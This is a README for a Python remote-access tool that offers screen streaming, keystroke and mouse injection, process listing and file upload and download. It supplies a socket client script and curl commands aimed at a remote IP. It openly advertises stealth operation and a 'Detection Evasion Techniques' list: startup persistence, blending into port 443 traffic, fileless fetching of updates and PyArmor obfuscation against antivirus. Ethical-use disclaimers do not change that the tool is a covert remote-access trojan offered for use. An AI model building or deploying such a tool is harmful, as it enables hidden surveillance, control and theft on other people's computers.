# Remote-Desktop-Monitoring-Tool-
Remote Desktop Monitoring Tool 

This Python-based tool enables remote screen viewing, keyboard & mouse control, process monitoring, and file transfers. It runs stealthily in the background, using SSL & AES encryption to secure communication while evading detection. ✔ For ethical use only

Remote Desktop Monitoring Tool - README

Project Overview
This tool provides remote screen viewing, keyboard & mouse control, process monitoring, and file transfers over a secure, encrypted connection. It is designed for legitimate remote administration, security testing (with permission), and IT monitoring.

⚠ Unauthorized use is illegal (e.g., UK Computer Misuse Act, GDPR).

Features

- Remote Screen Viewing → Stream the target computer’s display in real time.
- Keyboard & Mouse Control → Send keystrokes and mouse clicks remotely.
- Process Monitoring → Retrieve a list of active processes.
- File Transfer → Upload and download files securely.
- Stealth Mode → Runs in the background, using encryption and system integration to evade detection.

Installation & Setup
1. Install Dependencies

2. Run the following command:
`pip install flask pyautogui opencv-python numpy pynput psutil requests pyarmor pycryptodome`

2. Set Up SSL Encryption
Generate SSL certificates for secure communication:
`openssl req -newkey rsa:2048 -x509 -keyout key.pem -out cert.pem -days 365 -nodes`

Place key.pem and cert.pem in the same directory as the script.

3. Run the Tool
Windows: Run as Administrator.
`python remote_desktop_monitor.py`

Linux: Use sudo.
`sudo python3 remote_desktop_monitor.py`

Usage
Remote Screen Viewing
Run this client script on another machine:
```
import socket, pickle, struct, cv2
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("REMOTE_IP", 443))
while True:
    data_size = struct.calcsize("Q")
    packed_size = client.recv(data_size)
    size = struct.unpack("Q", packed_size)[0]
    data = b""
    while len(data) < size:
        packet = client.recv(4096)
        if not packet:
            break
        data += packet
    frame = pickle.loads(data)
    cv2.imshow("Remote Screen", frame)
    if cv2.waitKey(1) == ord("q"):
        break
client.close()
cv2.destroyAllWindows()
```

Keyboard & Mouse Control
Send keystrokes remotely:
```
from pynput.keyboard import Controller
keyboard = Controller()
keyboard.type("Hello, remote machine!")
```

Send mouse clicks:
```
from pynput.mouse import Controller, Button
mouse = Controller()
mouse.click(Button.left, 1)
```

Process Monitoring
Retrieve a list of running processes:
`curl http://REMOTE_IP:5000/processes`

File Transfer
Upload a file:
`curl -F "file=@/path/to/local/file" http://REMOTE_IP:5000/upload`

Download a file:
`curl -O http://REMOTE_IP:5000/download/filename`

Detection Evasion Techniques

- Runs in the Background → Registers as a startup service.
- Uses Port 443 → Blends in with HTTPS traffic.
- SSL & AES Encryption → Ensures secure data transmission.
- Fileless Execution → Fetches updates dynamically.
- Obfuscation with PyArmor → Prevents antivirus detection.



Legal Disclaimer
This tool is intended for legitimate use only. Unauthorized deployment is a criminal offense. Ensure compliance with relevant laws such as GDPR and the UK Computer Misuse Act.

Use responsibly.

